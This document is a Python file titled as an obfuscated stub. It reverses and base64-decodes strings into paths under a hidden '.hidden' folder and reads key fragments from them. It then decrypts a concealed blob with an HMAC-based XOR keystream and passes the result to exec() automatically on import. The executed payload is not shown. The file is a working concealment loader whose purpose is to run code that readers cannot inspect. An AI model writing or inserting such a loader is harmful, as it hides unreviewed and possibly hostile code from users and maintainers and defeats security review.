# Dorayaki Obfuscated Stub
import base64, os, hashlib, hmac
from pathlib import Path

_KEY_PARTS_OBF = ['wtmLmVjZ5YWMwATZiFjY5YTOjBDMiZzLiNWMlZWOhJDZkR2MzYTOy8iblRGZphmLv4iLv4iL', 'wtmLwgjZ3YmNyIjZykjZyEWMmVzMmFzLiNWMlZWOhJDZkR2MzYTOy8iblRGZphmLv4iLv4iL', 'wtmLkF2M2ATO4QmN2ITM5ETNkhDM0QzLiNWMlZWOhJDZkR2MzYTOy8iblRGZphmLv4iLv4iL', 'wtmLjhzYlRzYmNDO5U2NkBjNjFTYwI2LiNWMlZWOhJDZkR2MzYTOy8iblRGZphmLv4iLv4iL']
_BLOB_CHUNKS = ['MiRDIqqQsmiGqW7eo9hXBcvx7y1oIlvteGyt3L5HvYGwURobdnzTSAxsA5vrI5Zmmwcqna20uGC7eqzlpEhCy5pvQ7q26sIEpS+i586rgDXOyYW0REcg1PgBd35ha/SV2PWT+QNSMJgoctmHSmHci7JbMZ/SlM3EN+dovFEfi/tsrH1EVlSgI+Gx15FkG6hfnLSeF15bQASmsAJHSSdU6ojUsw0KKiWfxftRUKgDKmV9O+HKrV1T5US2L2G/Dzl9diW1L1fqScT2M9iivZSprZ/OmR/WT7eY36s0VwFoApP3JPl2kDsore4mh6am', 'YPLquG0SM7VFX4zfPzw7FXVQ5o/5JeJD3c/XC3Jbb91qeCMT7xo3psMBd/VvtD6x4xN+Z7OLitM3ajED5d9gt2wuvTi42aOH0+YmFW6kqyyaW6lDi/yoSLrJYkHqfrLGiDmKY7df7BEohNqE6bGxa3FQy8NBk8QzZlQlHk3a2IHuulAIHR2mPnakKKPrxRZUpT+lLsH4b2QAPXPW3SrVkR0Ka1lps0nAThB+wrlUXav7MbEPJFNxJusPh5io69hXA7L+rmywy1Xolk9+JXTCDXSeqog+NAKMnnh8TebglQpE6vJJCbo9BngyCKdO', 'xZuqw0hlzhhGVmjUZe3D5hrgOTVjoo9rthZeN8Ba84N4xJnFpdEjlXh7whsnSxfZSZCFFPANUEz20sttNHzmVhuoX3Yb+NA3EZhLkTsVB6CNp0HFIpp2HB5NA2GeetxboRIgVSeAQXR8ylNxK75S2mgxbhCVRj/mA9dfc4cjQ+t134CAM+gb4sgH2c1zXQboo/8lRA+HGpXzgjv+wP0SNf4VtloV4JSz7aGz0ATEFAk4XZJyao8yau+JYNGYRExLRjiXTHWB/SjNrjf9bZjzXZp9VYGYTbF8iMVMWasg2pD/vfw2JD+kBf9w/8FD', 't0Lin0xyJAyrDWK2ZZMGzE3HTyUoELzenCFH6wCxLhD/K3i9f9sa+GbjmmgLldATh435r1FJSYXjV2RT9zSD/YUCm2QZesogTzwkVYY6I7psZB86SWOkwKTDCxi+WzX67chRKlTHqLibmk6TQ6VAnUQ5sNXhLi/ZtM2Xx1/QJP5kgB6FeGlpbN4wbW/2L2K7o1kwssaIa5Nwa9jWcZHiBRJP+x2aznFl8dmCldUrv8RLR0C1XXlxZ9osRwU5dtqG9Qd5njMKu/sln2wcZr+hhUpVKS7DceP65vaoVTt/Q+q4YEmr/EMEJQb59Dez', 'bpN2tCbxRcNcxX7Di5nEKsocvgMu1O5rp8Kr4dkdb1qq7o/bZW3vp0ntapksCLqNF+fq6jH3lxVfqVEHzjxp7BknaI1HgGAFIyC8Tus4MXfpvRanldKSIU0o1Z6eMISbuOtjMd8/2yP2z8r5Z1J3WfEg2smmfmbedlgpI585+UYANz+EGVgtaRw6WXit6qpjvbygoKyLbEZTKm3Xg8V4YG75jZ3UtVcpsOzHcZMweLup/C5m3tBOEYDcHr6Qz1rwrUyGWyDFUzoUqmbpceIoHqYGoOpWPzbwS8Z5StJ1oYMqjEnIw5k4cwX6VI7N', '6l7fNrnPP2vsNtD/Gt1EJqFWd81Zs+HEI4IWBaqOUDyp0VScaZG2oxdVXNjkmmAx2DzJ2E0vYTgrpw6B7FLe4+luJknjLiQxFw95UzQcQBGp7nT744sgJ/J75+yCKRI9f6Ngcyj1jgOqLbi5HFex/XW57DoAAq6XmoiJw3XN1h4RJeUYzL2zbLL2wWhG2y5qkwopjoVgnLrWRu2xtwJSvU0x3y9iz0yyj7P7/pUuo7pMXLROwLQOXC/fIhhYvAJOvfe4abna8r3nG3KyfF9i1ilW8ik2ZLqa0ICf7oXy2pAGeZBPF/3+BvpBSWjR+/sk']

def _rev(s): return s[::-1]
def _read_key_parts():
    parts = []
    # FIX: Resolve relative to this file's directory
    base = Path(__file__).resolve().parent
    for obf in _KEY_PARTS_OBF:
        try:
            rel_path_str = base64.b64decode(_rev(obf)).decode('utf-8')
            p = base.joinpath(rel_path_str).resolve()
            parts.append(base64.b64decode(p.read_text('utf-8')))
        except Exception: pass
    return b''.join(parts)

def _keystream(key, nonce, length):
    out = bytearray(); counter = 0
    while len(out) < length:
        out.extend(hmac.new(key, nonce + counter.to_bytes(8,'big'), hashlib.sha256).digest())
        counter += 1
    return bytes(out[:length])

def _run():
    key = _read_key_parts()
    if not key: raise RuntimeError("Decryption Key not found (missing .hidden folder?)")
    blob = base64.b64decode(''.join([_rev(c) for c in _BLOB_CHUNKS]))
    nonce, ct = blob[:12], blob[12:]
    ks = _keystream(key, nonce, len(ct))
    plain = bytes(a ^ b for a, b in zip(ct, ks))
    try: src = plain.decode('utf-8')
    except: src = plain.decode('latin-1')
    exec(compile(src, __file__, 'exec'), globals())

_run()
